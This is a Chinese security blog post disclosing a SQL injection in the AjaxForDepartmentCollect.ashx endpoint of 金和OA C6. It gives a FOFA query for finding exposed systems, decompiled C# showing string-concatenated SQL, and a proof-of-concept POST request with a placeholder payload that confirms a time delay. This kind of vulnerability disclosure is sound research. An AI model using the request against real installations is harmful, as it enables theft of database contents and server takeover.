---
title: "金和OA AjaxForDepartmentCollect.ashx SQL注入漏洞"
source: https://mrxn.net/jswz/jhsoft-AjaxForDepartmentCollect-sqli.html
asset_dir: assets/金和oa-ajaxfordepartmentcollect.ashx-sql注入漏洞
---

# 金和OA AjaxForDepartmentCollect.ashx SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/12/18 13:32
* 297浏览
* [0评论](#comment)
* 19分钟阅读

深入探索

漏洞扫描服务

服务器安全服务

Windows安全工具


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

金和网络是专业信息化服务商,为城市监管部门提供了互联网+监管解决方案,为企事业单位提供组织协同OA系统开发平台,电子政务一体化平台,智慧电商平台等服务。金和OA C6 `AjaxForDepartmentCollect.ashx` 接口处存在[SQL注入](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5)漏洞，攻击者除了可以利用SQL注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

SQL注入检测工具

# 影响版本

金和OA C6

# fofa语法

> app="金和网络-金和OA"

# 漏洞分析

根据 `AjaxForDepartmentCollect.ashx` 的源码，在 `bin` 目录下查找 `JHBase.Web.CostControl.dll` 将其进行反编译后找到 **AjaxForDepartmentCollect** 的处理逻辑

[![金和OA AjaxForDepartmentCollect.ashx SQL注入漏洞](images/img-001-18c3172c35c2.webp)](https://image.mrxn.net/b1a16e774a34420984ac2abfbc3c3168.webp)

根据`strType`的值进入不同的处理流程

代码安全审计

深入探索

安全工具开发

漏洞修复方案

文本剥离工具

[![金和OA AjaxForDepartmentCollect.ashx SQL注入漏洞](images/img-002-79e9525fab08.webp)](https://image.mrxn.net/06ba1cdb396447e6a24a58432308b4eb.webp)

当 `strType=getHistoryList` 时，`strDeptId`、`strCollectType`被带入`GetCollectHistory`方法

```
protected string GetCollectHistory(string strYear, string strDepID, string strCollectType)
{
  string str = string.Empty;
  DataTable collectList = this.bcDao.GetCollectList(strYear, strDepID, strCollectType);
```

跟进`GetCollectList`方法

```
public DataTable GetCollectList(string strYear, string strDepID, string strCollectType)
{
  if (string.op_Equality(strCollectType, "Department"))
    this.strSql = $"select c.CollectYear,c.CollectTime,c.CollectMoney,d.DeptName,c.Subjects,c.CreateDate ,c.SubRemark\r\n                        from CollectList c \r\n                        left join Department d on c.DeptID = d.DeptID\r\n                        where c.CollectState = 0 and c.CollectYear = {strYear} and c.DeptID = {strDepID} order by c.CreateDate";
  if (string.op_Equality(strCollectType, "Center"))
    this.strSql = $"select * from CollectList c\r\n                        where c.CollectState = 0 and c.CollectType = 'Department' and c.CollectYear = {strYear}and c.DeptID in (select DeptID from Department where DeptParentID = {strDepID})";
  return this.db.ExecSQLReDataTable(this.strSql);
}
```

当**strCollectType**=**Department或Center**时，`strYear`和`strDeptId`被直接拼接到SQL语句中执行，造成[SQL注入](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5)漏洞。

# 漏洞复现

```
POST /c6/JHSoft.Web.CostControl/Collect/AjaxForDepartmentCollect.ashx HTTP/1.1
Host: jhsoft.mrxn.net
Content-Type: application/x-www-form-urlencoded

strType=getHistoryList&strDeptId=SQLI_POC&strCollectType=Department&strYear=2012
```

[![金和OA AjaxForDepartmentCollect.ashx SQL注入漏洞](images/img-003-0d621d68785a.webp)](https://image.mrxn.net/41965d1c7af74621a52e10a22dabf43c.webp)

成功延时 4 秒

漏洞扫描服务

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#0day](https://mrxn.net/tag/0day)
* [#asp.net](https://mrxn.net/tag/asp.net)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[金和OA AjaxForDepartmentCollect.ashx SQL注入漏洞](https://mrxn.net/jswz/jhsoft-AjaxForDepartmentCollect-sqli.html)  
文章链接：<https://mrxn.net/jswz/jhsoft-AjaxForDepartmentCollect-sqli.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/jhsoft-AjaxForDepartmentCollect-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

编程

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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